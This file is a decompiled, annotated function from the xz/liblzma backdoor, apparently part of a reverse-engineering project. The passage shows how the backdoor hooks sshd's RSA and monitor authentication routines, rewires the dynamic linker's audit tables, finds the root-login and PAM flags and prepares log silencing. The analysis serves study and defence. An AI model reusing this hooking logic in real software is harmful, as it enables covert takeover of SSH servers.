// /home/kali/xzre-ghidra/xzregh/105830_backdoor_setup.c
// Function: backdoor_setup @ 0x105830
// Calling convention: __stdcall
// Prototype: BOOL __stdcall backdoor_setup(backdoor_setup_params_t * params)


/*
 * AutoDoc: The loader’s main workhorse. It snapshots the caller’s GOT/stack, builds a local `backdoor_data_t` describing all observed
 * modules, resolves sshd/libcrypto/liblzma/libc/ld.so via `process_shared_libraries`, initialises the shared globals, and pulls in
 * the `backdoor_hooks_data_t` blob sitting inside liblzma. With those pieces it refreshes the string-reference catalogue,
 * configures the global context (payload buffers, sshd/log contexts, import tables), runs the sensitive-data + sshd-metadata
 * discovery routines, and finally rewires ld.so’s audit tables so `backdoor_symbind64` is invoked for every sshd→libcrypto PLT
 * call. On success it copies the updated hook table back into liblzma and leaves the cpuid GOT slot ready to resume execution.
 */

#include "xzre_types.h"

BOOL backdoor_setup(backdoor_setup_params_t *params)

{
  global_context_t *ctx;
  imported_funcs_t *imported_funcs;
  u32 *resolved_count_ptr;
  audit_ifaces *audit_ifaces_ptr;
  elf_handles_t *elf_handles;
  uint log_string_slot;
  u32 resolver_status;
  u64 *cpuid_got_entry;
  u64 *frame_address;
  backdoor_hooks_ctx_t *hooks_ctx;
  backdoor_hooks_data_t **hooks_data_addr_ptr;
  u64 signed_data_size;
  pfn_RSA_get0_key_t hook_RSA_get0_key;
  pfn_EVP_PKEY_set1_RSA_t hook_EVP_PKEY_set1_RSA;
  sshd_monitor_func_t mm_answer_keyverify_fn;
  elf_symbol_get_addr_fn sym_get_addr;
  Elf64_Addr libcrypto_sym_offset;
  Elf64_Ehdr *libcrypto_ehdr;
  sshd_ctx_t *sshd_ctx_ptr;
  byte *hook_table_bytes;
  u32 *resolved_count_cursor;
  u32 resolved_mask0;
  u32 resolved_mask1;
  u32 resolved_mask2;
  BOOL success_flag;
  elf_info_t *elf_info;
  u8 reg_tmp;
  EncodedStringId string_id;
  BOOL bool_result;
  void *code_segment;
  lzma_allocator *libc_allocator;
  pfn_malloc_usable_size_t malloc_usable_size_stub;
  lzma_allocator *libcrypto_allocator;
  elf_info_t *libcrypto_info;
  pfn_EVP_MD_CTX_new_t evp_md_ctx_new_alloc;
  void *data_segment;
  elf_functions_t *elf_functions_table;
  pfn_BN_free_t BN_free_stub;
  Elf64_Sym *bn_bin2bn_sym;
  char *string_cursor;
  pfn_BN_bn2bin_t BN_bn2bin_stub;
  Elf64_Sym *bn_dup_sym;
  Elf64_Sym *rsa_free_sym;
  pfn_RSA_set0_key_t RSA_set0_key_stub;
  Elf64_Sym *rsa_sign_sym;
  u8 *authprobe_func_end;
  Elf64_Rela *mem_address;
  int *int_ptr;
  log_handler_fn *pplVar45;
  log_handler_fn *pplVar46;
  long loop_idx;
  log_handler_fn *pplVar48;
  Elf64_Ehdr *string_begin;
  log_handler_fn *addr1;
  backdoor_data_t *backdoor_data_cursor;
  elf_entry_ctx_t *entry_ctx;
  global_context_t *global_ctx_cursor;
  backdoor_hooks_data_t *hooks_data_cursor;
  sshd_ctx_t *sshd_ctx_cursor;
  sshd_log_ctx_t *sshd_log_ctx;
  imported_funcs_t *imported_funcs_cursor;
  dasm_ctx_t *insn_ctx_cursor;
  audit_ifaces *audit_ifaces_ptr;
  u8 reg_lower;
  u8 reg_upper;
  u8 *sshd_code_end_ptr;
  sshd_monitor_func_t *authprobe_func_start;
  int auth_root_vote_count;
  log_handler_fn *addr2;
  u8 zero_seed;
  string_references_t string_refs;
  backdoor_shared_libraries_data_t shared_maps;
  backdoor_data_t backdoor_data;
  backdoor_hooks_data_t *hooks;
  global_context_t *global_ctx;
  u8 *local_b48;
  log_handler_fn *local_b20;
  backdoor_hooks_data_t *local_b10;
  EncodedStringId local_acc;
  ptrdiff_t local_ac8;
  pfn_RSA_public_decrypt_t *local_ac0;
  pfn_EVP_PKEY_set1_RSA_t *local_ab8;
  pfn_RSA_get0_key_t *local_ab0;
  void *local_aa8;
  u64 local_aa0;
  u64 local_a98;
  u64 local_a90;
  main_elf_t local_a88;
  u64 *local_a70;
  backdoor_shared_libraries_data_t local_a68;
  dasm_ctx_t local_a30;
  dasm_ctx_t local_9d8;
  backdoor_data_t local_980;
  
  zero_seed = 0;
  local_acc = 0;
  backdoor_data_cursor = &local_980;
  for (loop_idx = 0x256; loop_idx != 0; loop_idx = loop_idx + -1) {
    *(undefined4 *)&backdoor_data_cursor->sshd_link_map = 0;
    backdoor_data_cursor = (backdoor_data_t *)((long)&backdoor_data_cursor->sshd_link_map + 4);
  }
  elf_handles = &local_980.elf_handles;
  local_980.elf_handles.ldso = &local_980.dynamic_linker_info;
  local_980.elf_handles.libc = &local_980.libc_info;
  local_ac8 = 0;
  local_ac0 = (pfn_RSA_public_decrypt_t *)0x0;
  local_ab8 = (pfn_EVP_PKEY_set1_RSA_t *)0x0;
  local_ab0 = (pfn_RSA_get0_key_t *)0x0;
  local_aa8 = (void *)0x0;
  entry_ctx = params->entry_ctx;
  local_980.elf_handles.liblzma = &local_980.liblzma_info;
  local_980.elf_handles.libcrypto = &local_980.libcrypto_info;
  local_980.elf_handles.sshd = &local_980.main_info;
  local_980.data_handle.runtime_data = &local_980;
  local_980.data_handle.cached_elf_handles = elf_handles;
  update_got_address(entry_ctx);
  code_segment = (entry_ctx->got_ctx).tls_got_entry;
  if (code_segment != (void *)0x0) {
    cpuid_got_entry = *(u64 **)((long)code_segment + (entry_ctx->got_ctx).cpuid_slot_index * 8 + 0x18);
    frame_address = entry_ctx->resolver_frame;
    loop_idx = (long)frame_address - (long)cpuid_got_entry;
    if (frame_address <= cpuid_got_entry) {
      loop_idx = (long)cpuid_got_entry - (long)frame_address;
    }
    if (loop_idx < 0x50001) {
      string_begin = (Elf64_Ehdr *)((ulong)cpuid_got_entry & 0xfffffffffffff000);
      libcrypto_ehdr = string_begin + -0x800;
LAB_00105951:
      string_id = get_string_id((char *)string_begin,(char *)0x0);
      if (string_id != STR_ELF) goto code_r0x00105962;
      local_a88.__libc_stack_end = &local_aa8;
      local_a70 = params->entry_ctx->resolver_frame;
      local_a88.elf_handles = elf_handles;
      local_a88.dynamic_linker_ehdr = string_begin;
      bool_result = main_elf_parse(&local_a88);
      if (bool_result != FALSE) {
        local_980.active_lzma_allocator = get_lzma_allocator();
        loop_idx = 0;
        do {
          *(undefined1 *)((long)&local_980.saved_lzma_allocator.alloc + loop_idx) =
               *(undefined1 *)((long)&(local_980.active_lzma_allocator)->alloc + loop_idx);
          loop_idx = loop_idx + 1;
        } while (loop_idx != 0x18);
        local_a68.rsa_public_decrypt_slot = &local_ac0;
        local_a68.evp_set1_rsa_slot = &local_ab8;
        local_a68.rsa_get0_key_slot = &local_ab0;
        local_a68.hooks_data_slot = params->hook_ctx->hooks_data_slot_ptr;
        local_a68.shared_maps = &local_980;
        local_a68.elf_handles = elf_handles;
        local_a68.libc_imports = &local_980.libc_imports;
        bool_result = process_shared_libraries(&local_a68);
        if (bool_result == FALSE) goto LAB_00105a59;
        local_b10 = *params->hook_ctx->hooks_data_slot_ptr;
        ctx = &local_b10->global_ctx;
        imported_funcs = &local_b10->imported_funcs;
        global_ctx_cursor = ctx;
        for (loop_idx = 0x5a; loop_idx != 0; loop_idx = loop_idx + -1) {
          global_ctx_cursor->uses_endbr64 = FALSE;
          global_ctx_cursor = (global_context_t *)((long)global_ctx_cursor + (ulong)zero_seed * -8 + 4);
        }
        (local_b10->global_ctx).sshd_log_ctx = &local_b10->sshd_log_ctx;
        hooks_ctx = params->hook_ctx;
        (local_b10->global_ctx).imported_funcs = imported_funcs;
        (local_b10->global_ctx).sshd_ctx = &local_b10->sshd_ctx;
        hooks_data_addr_ptr = hooks_ctx->hooks_data_slot_ptr;
        (local_b10->global_ctx).libc_imports = &local_b10->libc_imports;
        hooks_data_cursor = *hooks_data_addr_ptr;
        signed_data_size = hooks_data_cursor->signed_data_size;
        (local_b10->global_ctx).payload_bytes_buffered = 0;
        (local_b10->global_ctx).payload_buffer = &hooks_data_cursor->signed_data;
        (local_b10->global_ctx).payload_buffer_size = signed_data_size;
        elf_find_string_references(&local_980.main_info,&local_980.sshd_string_refs);
        local_aa0 = 0;
        code_segment = elf_get_code_segment(local_980.elf_handles.liblzma,&local_aa0);
        if (code_segment != (void *)0x0) {
          (local_b10->global_ctx).liblzma_text_start = code_segment;
          (local_b10->global_ctx).liblzma_text_end = (void *)((long)code_segment + local_aa0);
          hooks_data_cursor = local_b10;
          for (loop_idx = 0x4e; loop_idx != 0; loop_idx = loop_idx + -1) {
            (hooks_data_cursor->ldso_ctx)._unknown1459[0] = '\0';
            (hooks_data_cursor->ldso_ctx)._unknown1459[1] = '\0';
            (hooks_data_cursor->ldso_ctx)._unknown1459[2] = '\0';
            (hooks_data_cursor->ldso_ctx)._unknown1459[3] = '\0';
            hooks_data_cursor = (backdoor_hooks_data_t *)((long)hooks_data_cursor + (ulong)zero_seed * -8 + 4);
          }
          hooks_ctx = params->hook_ctx;
          (local_b10->ldso_ctx).imported_funcs = imported_funcs;
          hook_RSA_get0_key = hooks_ctx->rsa_get0_key_entry;
          (local_b10->ldso_ctx).hook_RSA_public_decrypt = hooks_ctx->rsa_public_decrypt_entry;
          hook_EVP_PKEY_set1_RSA = params->shared_globals->evp_set1_rsa_hook_entry;
          (local_b10->ldso_ctx).hook_RSA_get0_key = hook_RSA_get0_key;
          (local_b10->ldso_ctx).hook_EVP_PKEY_set1_RSA = hook_EVP_PKEY_set1_RSA;
          sshd_ctx_cursor = &local_b10->sshd_ctx;
          for (loop_idx = 0x38; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
            sshd_ctx_cursor = (sshd_ctx_t *)((long)sshd_ctx_cursor + (ulong)zero_seed * -8 + 4);
          }
          (local_b10->sshd_ctx).mm_answer_authpassword_hook =
               params->shared_globals->authpassword_hook_entry;
          mm_answer_keyverify_fn = params->hook_ctx->mm_answer_keyverify_entry;
          (local_b10->sshd_ctx).mm_answer_keyallowed_hook =
               params->hook_ctx->mm_answer_keyallowed_entry;
          (local_b10->sshd_ctx).mm_answer_keyverify_hook = mm_answer_keyverify_fn;
          sshd_log_ctx = &local_b10->sshd_log_ctx;
          for (loop_idx = 0x1a; loop_idx != 0; loop_idx = loop_idx + -1) {
            sshd_log_ctx->log_squelched = FALSE;
            sshd_log_ctx = (sshd_log_ctx_t *)((long)sshd_log_ctx + (ulong)zero_seed * -8 + 4);
          }
          (local_b10->sshd_log_ctx).log_hook_entry = params->hook_ctx->mm_log_handler_entry;
          *params->shared_globals->global_ctx_slot = ctx;
          imported_funcs_cursor = imported_funcs;
          for (loop_idx = 0x4a; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(undefined4 *)&imported_funcs_cursor->RSA_public_decrypt_orig = 0;
            imported_funcs_cursor = (imported_funcs_t *)((long)imported_funcs_cursor + (ulong)zero_seed * -8 + 4);
          }
          (local_b10->imported_funcs).RSA_public_decrypt_plt = local_ac0;
          (local_b10->imported_funcs).EVP_PKEY_set1_RSA_plt = local_ab8;
          (local_b10->imported_funcs).RSA_get0_key_plt = local_ab0;
          loop_idx = 0;
          do {
            (local_b10->sshd_log_ctx).reserved_alignment[loop_idx + -0x7c] =
                 *(u8 *)((long)&local_980.libc_imports.resolved_imports_count + loop_idx);
            loop_idx = loop_idx + 1;
          } while (loop_idx != 0x70);
          (local_b10->imported_funcs).libc = &local_b10->libc_imports;
          (local_b10->libc_imports).__libc_stack_end = local_aa8;
          libc_allocator = get_lzma_allocator();
          libc_allocator->opaque = local_980.elf_handles.libc;
          malloc_usable_size_stub = (pfn_malloc_usable_size_t)lzma_alloc(0x440,libc_allocator);
          (local_b10->libc_imports).malloc_usable_size = malloc_usable_size_stub;
          if (malloc_usable_size_stub != (pfn_malloc_usable_size_t)0x0) {
            (local_b10->libc_imports).resolved_imports_count =
                 (local_b10->libc_imports).resolved_imports_count + 1;
          }
          bool_result = find_dl_audit_offsets(&local_980.data_handle,&local_ac8,local_b10,imported_funcs)
          ;
          if (bool_result == FALSE) goto LAB_00105a60;
          libcrypto_allocator = get_lzma_allocator();
          libcrypto_allocator->opaque = local_980.elf_handles.libcrypto;
          libcrypto_info = local_980.elf_handles.libcrypto;
          if (local_980.elf_handles.libcrypto != (elf_info_t *)0x0) {
            libcrypto_info = (elf_info_t *)
                      elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_get0_key,0);
            evp_md_ctx_new_alloc = (pfn_EVP_MD_CTX_new_t)lzma_alloc(0xaf8,libcrypto_allocator);
            (local_b10->imported_funcs).EVP_MD_CTX_new = evp_md_ctx_new_alloc;
            if (evp_md_ctx_new_alloc != (pfn_EVP_MD_CTX_new_t)0x0) {
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          elf_info = local_980.elf_handles.sshd;
          local_a30.instruction = (u8 *)0x0;
          local_9d8.instruction = (u8 *)0x0;
          code_segment = elf_get_code_segment(local_980.elf_handles.sshd,(u64 *)&local_a30);
          sshd_code_end_ptr = local_a30.instruction + (long)code_segment;
          data_segment = elf_get_data_segment(elf_info,(u64 *)&local_9d8,FALSE);
          (local_b10->global_ctx).sshd_text_start = code_segment;
          (local_b10->global_ctx).sshd_text_end = sshd_code_end_ptr;
          (local_b10->global_ctx).sshd_data_start = data_segment;
          (local_b10->global_ctx).sshd_data_end = local_9d8.instruction + (long)data_segment;
          elf_functions_table = get_elf_functions_address();
          if (((elf_functions_table == (elf_functions_t *)0x0) ||
              (sym_get_addr = elf_functions_table->elf_symbol_get_addr, sym_get_addr == (elf_symbol_get_addr_fn)0x0)) ||
             (elf_functions_table->elf_parse == (elf_parse_fn)0x0)) goto LAB_00105a60;
          bn_bin2bn_sym = (Elf64_Sym *)0x0;
          BN_free_stub = (pfn_BN_free_t)(*sym_get_addr)(local_980.elf_handles.libcrypto,STR_BN_free);
          (local_b10->imported_funcs).BN_free = BN_free_stub;
          if (BN_free_stub != (pfn_BN_free_t)0x0) {
            bn_bin2bn_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_bin2bn,0);
          }
          local_acc = STR_ssh_rsa_cert_v01_openssh_com;
          string_cursor = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
          (local_b10->global_ctx).ssh_rsa_cert_alg = string_cursor;
          if (string_cursor == (char *)0x0) goto LAB_00105a60;
          local_acc = STR_rsa_sha2_256;
          string_cursor = elf_find_string(local_980.elf_handles.sshd,&local_acc,(void *)0x0);
          (local_b10->global_ctx).rsa_sha2_256_alg = string_cursor;
          if (string_cursor == (char *)0x0) goto LAB_00105a60;
          bn_dup_sym = (Elf64_Sym *)0x0;
          BN_bn2bin_stub = (pfn_BN_bn2bin_t)
                    elf_symbol_get_addr(local_980.elf_handles.libcrypto,STR_BN_bn2bin);
          (local_b10->imported_funcs).BN_bn2bin = BN_bn2bin_stub;
          if (BN_bn2bin_stub != (pfn_BN_bn2bin_t)0x0) {
            bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_BN_dup,0);
            if (bn_dup_sym != (Elf64_Sym *)0x0) {
              libcrypto_sym_offset = bn_dup_sym->st_value;
              libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (local_b10->imported_funcs).BN_dup = (pfn_BN_dup_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
            }
            bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_new,0);
            if ((local_b10->imported_funcs).BN_free != (pfn_BN_free_t)0x0) {
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
            }
          }
          rsa_free_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_free,0);
          RSA_set0_key_stub = (pfn_RSA_set0_key_t)(*sym_get_addr)(local_980.elf_handles.libcrypto,STR_RSA_set0_key)
          ;
          rsa_sign_sym = (Elf64_Sym *)0x0;
          (local_b10->imported_funcs).RSA_set0_key = RSA_set0_key_stub;
          if (RSA_set0_key_stub != (pfn_RSA_set0_key_t)0x0) {
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            rsa_sign_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_RSA_sign,0);
            if (libcrypto_info != (elf_info_t *)0x0) {
              libcrypto_sym_offset = libcrypto_info->load_base_vaddr;
              libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
              resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
              *resolved_count_ptr = *resolved_count_ptr + 1;
              (local_b10->imported_funcs).RSA_get0_key_resolved =
                   (pfn_RSA_get0_key_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
            }
          }
          if ((local_b10->imported_funcs).BN_bn2bin != (pfn_BN_bn2bin_t)0x0) {
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
          }
          bool_result = sshd_find_sensitive_data
                             (local_980.elf_handles.sshd,local_980.elf_handles.libcrypto,
                              &local_980.sshd_string_refs,imported_funcs,ctx);
          if (bool_result == FALSE) goto LAB_00105a60;
          if (bn_bin2bn_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = bn_bin2bn_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).BN_bin2bn = (pfn_BN_bin2bn_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          if (bn_dup_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = bn_dup_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_new = (pfn_RSA_new_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          if (rsa_free_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = rsa_free_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_free = (pfn_RSA_free_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          if (rsa_sign_sym != (Elf64_Sym *)0x0) {
            libcrypto_sym_offset = rsa_sign_sym->st_value;
            libcrypto_ehdr = (local_980.elf_handles.libcrypto)->elfbase;
            resolved_count_ptr = &(local_b10->imported_funcs).resolved_imports_count;
            *resolved_count_ptr = *resolved_count_ptr + 1;
            (local_b10->imported_funcs).RSA_sign = (pfn_RSA_sign_t)(libcrypto_ehdr->e_ident + libcrypto_sym_offset);
          }
          bn_bin2bn_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptUpdate,0);
          libcrypto_info = local_980.elf_handles.sshd;
          sshd_ctx_cursor = (local_b10->global_ctx).sshd_ctx;
          local_a30.instruction = (u8 *)0x0;
          local_a98 = local_a98 & 0xffffffff00000000;
          sshd_ctx_cursor->have_mm_answer_keyallowed = FALSE;
          sshd_ctx_cursor->have_mm_answer_authpassword = FALSE;
          sshd_ctx_cursor->have_mm_answer_keyverify = FALSE;
          code_segment = elf_get_data_segment(local_980.elf_handles.sshd,(u64 *)&local_a30,FALSE);
          sshd_code_end_ptr = local_a30.instruction;
          if ((code_segment != (void *)0x0) &&
             (local_980.sshd_string_refs.mm_request_send.func_start != (void *)0x0)) {
            sshd_ctx_cursor->mm_request_send_start = local_980.sshd_string_refs.mm_request_send.func_start;
            sshd_ctx_cursor->mm_request_send_end = local_980.sshd_string_refs.mm_request_send.func_end;
            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x400);
            string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a98,(void *)0x0);
            sshd_ctx_cursor->STR_without_password = string_cursor;
            if ((string_cursor != (char *)0x0) &&
               (bool_result = elf_find_function_pointer
                                   (XREF_mm_answer_authpassword,
                                    &sshd_ctx_cursor->mm_answer_authpassword_start,
                                    &sshd_ctx_cursor->mm_answer_authpassword_end,
                                    &sshd_ctx_cursor->mm_answer_authpassword_slot,libcrypto_info,
                                    &local_980.sshd_string_refs,ctx), bool_result == FALSE)) {
              sshd_ctx_cursor->mm_answer_authpassword_start = (sshd_monitor_func_t *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_end = (void *)0x0;
              sshd_ctx_cursor->mm_answer_authpassword_slot = (sshd_monitor_func_t *)0x0;
            }
            local_a98 = CONCAT44(*(uint *)((u8 *)&local_a98 + 4),0x7b8);
            string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a98,(void *)0x0);
            sshd_ctx_cursor->STR_publickey = string_cursor;
            if (string_cursor != (char *)0x0) {
              bool_result = elf_find_function_pointer
                                 (XREF_mm_answer_keyallowed,&sshd_ctx_cursor->mm_answer_keyallowed_start,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_end,
                                  &sshd_ctx_cursor->mm_answer_keyallowed_slot,libcrypto_info,
                                  &local_980.sshd_string_refs,ctx);
              if (bool_result == FALSE) {
                sshd_ctx_cursor->mm_answer_keyallowed_start = (sshd_monitor_func_t *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_end = (void *)0x0;
                sshd_ctx_cursor->mm_answer_keyallowed_slot = (sshd_monitor_func_t *)0x0;
              }
              else {
                bool_result = elf_find_function_pointer
                                   (XREF_mm_answer_keyverify,&sshd_ctx_cursor->mm_answer_keyverify_start,
                                    &sshd_ctx_cursor->mm_answer_keyverify_end,
                                    &sshd_ctx_cursor->mm_answer_keyverify_slot,libcrypto_info,
                                    &local_980.sshd_string_refs,ctx);
                if (bool_result == FALSE) {
                  sshd_ctx_cursor->mm_answer_keyverify_start = (sshd_monitor_func_t *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_end = (void *)0x0;
                  sshd_ctx_cursor->mm_answer_keyverify_slot = (sshd_monitor_func_t *)0x0;
                }
              }
            }
            if ((sshd_ctx_cursor->mm_answer_authpassword_start != (sshd_monitor_func_t *)0x0) ||
               (sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0)) {
              sshd_ctx_ptr = (local_b10->global_ctx).sshd_ctx;
              local_9d8.instruction = (u8 *)0x0;
              authprobe_func_start = sshd_ctx_ptr->mm_answer_authpassword_start;
              if (authprobe_func_start == (sshd_monitor_func_t *)0x0) {
                authprobe_func_start = sshd_ctx_ptr->mm_answer_keyallowed_start;
                if (authprobe_func_start == (sshd_monitor_func_t *)0x0) goto LAB_001065af;
                authprobe_func_end = (u8 *)sshd_ctx_ptr->mm_answer_keyallowed_end;
              }
              else {
                authprobe_func_end = (u8 *)sshd_ctx_ptr->mm_answer_authpassword_end;
              }
              success_flag = FALSE;
              string_cursor = (char *)0x0;
              local_a90 = CONCAT44(*(uint *)((u8 *)&local_a90 + 4),0x198);
              while (string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)&local_a90,string_cursor),
                    string_cursor != (char *)0x0) {
                local_9d8.instruction = (u8 *)0x0;
                string_id = (EncodedStringId)string_cursor;
                mem_address = elf_find_rela_reloc(libcrypto_info,string_id,0);
                if (mem_address == (Elf64_Rela *)0x0) {
                  local_9d8.instruction = (u8 *)0x0;
                  success_flag = TRUE;
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(libcrypto_info,string_id);
                }
                while (mem_address != (Elf64_Rela *)0x0) {
                  do {
                    bool_result = elf_contains_vaddr_relro(libcrypto_info,(u64)mem_address,8,1);
                    if ((bool_result != FALSE) &&
                       (bool_result = find_instruction_with_mem_operand_ex
                                           ((u8 *)authprobe_func_start,authprobe_func_end,(dasm_ctx_t *)0x0,0x109,
                                            mem_address), bool_result != FALSE)) {
                      authprobe_func_start = sshd_ctx_cursor->mm_answer_authpassword_start;
                      ((local_b10->global_ctx).sshd_ctx)->auth_log_fmt_reloc = (char *)mem_address;
                      if (authprobe_func_start != (sshd_monitor_func_t *)0x0) {
                        sshd_ctx_cursor->have_mm_answer_authpassword = TRUE;
                      }
                      if ((sshd_ctx_cursor->mm_answer_keyallowed_start != (sshd_monitor_func_t *)0x0) &&
                         (sshd_ctx_cursor->have_mm_answer_keyallowed = TRUE,
                         sshd_ctx_cursor->mm_answer_keyverify_start != (sshd_monitor_func_t *)0x0)) {
                        sshd_ctx_cursor->have_mm_answer_keyverify = TRUE;
                      }
                      int_ptr = (int *)find_addr_referenced_in_mov_instruction
                                                 (XREF_start_pam,&local_980.sshd_string_refs,code_segment
                                                  ,sshd_code_end_ptr + (long)code_segment);
                      if (int_ptr != (int *)0x0) {
                        ((local_b10->global_ctx).sshd_ctx)->use_pam_ptr = int_ptr;
                      }
                      insn_ctx_cursor = &local_9d8;
                      success_flag = FALSE;
                      *(uint *)&local_9d8.instruction_size = 0x70;
                      local_9d8.instruction = (u8 *)0xc5800000948;
                      goto LAB_00106471;
                    }
                    if (success_flag) goto LAB_001063c8;
                    mem_address = elf_find_rela_reloc(libcrypto_info,string_id,0);
                  } while (mem_address != (Elf64_Rela *)0x0);
                  local_9d8.instruction = (u8 *)0x0;
LAB_001063c8:
                  mem_address = (Elf64_Rela *)elf_find_relr_reloc(libcrypto_info,string_id);
                  success_flag = TRUE;
                }
                string_cursor = string_cursor + 8;
              }
            }
          }
          goto LAB_001065af;
        }
        goto LAB_00105a60;
      }
    }
  }
LAB_00105a59:
  local_b10 = (backdoor_hooks_data_t *)0x0;
  goto LAB_00105a60;
code_r0x00105962:
  string_begin = string_begin + -0x40;
  if (string_begin == libcrypto_ehdr) goto LAB_00105a59;
  goto LAB_00105951;
LAB_00106471:
  do {
    string_cursor = elf_find_string(libcrypto_info,(EncodedStringId *)insn_ctx_cursor,(void *)0x0);
    if (string_cursor != (char *)0x0) {
      if (success_flag) {
        ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
        goto LAB_001064b8;
      }
      success_flag = TRUE;
    }
    insn_ctx_cursor = (dasm_ctx_t *)((long)&insn_ctx_cursor->instruction + 4);
  } while (insn_ctx_cursor != (dasm_ctx_t *)((long)&local_9d8.instruction_size + 4));
  ((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
LAB_001064b8:
  int_ptr = (int *)find_addr_referenced_in_mov_instruction
                             (XREF_auth_root_allowed,&local_980.sshd_string_refs,code_segment,
                              sshd_code_end_ptr + (long)code_segment);
  if (int_ptr != (int *)0x0) {
    if ((((local_b10->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
       ((local_b10->global_ctx).uses_endbr64 != FALSE)) {
      auth_root_vote_count = 0;
      loop_idx = 0;
      *(uint *)&local_9d8.instruction_size = 0x10;
      local_9d8.instruction = (u8 *)0xf0000000e;
      hooks = (backdoor_hooks_data_t *)0x0;
      do {
        sshd_code_end_ptr = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
                        [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_start;
        if (sshd_code_end_ptr != (u8 *)0x0) {
          authprobe_func_end = (u8 *)(&local_980.sshd_string_refs.xcalloc_zero_size)
                          [*(uint *)(local_9d8.opcode_window + loop_idx * 4 + -0x25)].func_end;
          auth_root_vote_count = auth_root_vote_count + 1;
          bool_result = find_instruction_with_mem_operand(sshd_code_end_ptr,authprobe_func_end,(dasm_ctx_t *)0x0,int_ptr);
          if ((bool_result != FALSE) ||
             (bool_result = find_add_instruction_with_mem_operand
                                 (sshd_code_end_ptr,authprobe_func_end,(dasm_ctx_t *)0x0,int_ptr), bool_result != FALSE)) {
            hooks = (backdoor_hooks_data_t *)(ulong)((int)hooks + 1);
          }
        }
        loop_idx = loop_idx + 1;
      } while (loop_idx != 3);
      if ((auth_root_vote_count != 0) && ((int)hooks == 0)) goto LAB_001065af;
    }
    ((local_b10->global_ctx).sshd_ctx)->permit_root_login_ptr = int_ptr;
  }
LAB_001065af:
  bn_dup_sym = elf_symbol_get(local_980.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
  bool_result = sshd_find_monitor_struct(local_980.elf_handles.sshd,&local_980.sshd_string_refs,ctx);
  if (bool_result == FALSE) {
    (local_b10->sshd_ctx).have_mm_answer_keyallowed = FALSE;
    (local_b10->sshd_ctx).have_mm_answer_keyverify = FALSE;
  }
  sshd_log_ctx = (local_b10->global_ctx).sshd_log_ctx;
  libc_allocator->opaque = local_980.elf_handles.libc;
  local_a98 = 0;
  sshd_log_ctx->log_squelched = FALSE;
  sshd_log_ctx->handler_slots_valid = FALSE;
  code_segment = elf_get_code_segment(&local_980.main_info,&local_a98);
  signed_data_size = local_a98;
  if ((((code_segment != (void *)0x0) && (0x10 < local_a98)) &&
      ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start != (u8 *)0x0)) &&
     (((local_b10->global_ctx).uses_endbr64 == FALSE ||
      (bool_result = is_endbr64_instruction
                          ((u8 *)local_980.sshd_string_refs.sshlogv_format.func_start,
                           (u8 *)((long)local_980.sshd_string_refs.sshlogv_format.func_start + 4),
                           0xe230), bool_result != FALSE)))) {
    sshd_log_ctx->sshlogv_impl = local_980.sshd_string_refs.sshlogv_format.func_start;
    insn_ctx_cursor = &local_a30;
